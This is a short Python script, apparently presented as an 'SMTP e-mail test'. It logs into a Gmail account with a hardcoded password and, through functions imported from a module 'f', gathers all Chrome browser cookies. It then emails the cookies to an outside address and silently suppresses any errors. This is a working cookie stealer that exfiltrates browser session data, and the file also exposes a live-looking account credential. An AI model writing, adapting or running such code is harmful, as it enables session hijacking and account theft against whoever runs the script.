import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from macpath import basename
sender = 'petterjoin2018@gmail.com'
receivers = ['danhcntt15@gmail.com'] #bcc

message = """From: From Person <@gmail.com>
To: To Person <danhcntt15@gmail.com>
Subject: SMTP e-mail test

This is a test e-mail message.
"""



try:
    from f import *
    smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpObj.starttls()
    smtpObj.login("petterjoin2018@gmail.com", "fakatvdofpozscyq")
    
#     chrome
    message = get_cookies_host_key(get_all_cookies_chrome())
    
    message = message +"\n\n\n\n"+print_cookie(get_all_cookies_chrome())
    smtpObj.sendmail(sender, receivers, message)    
    
    

except Exception:
    a=0
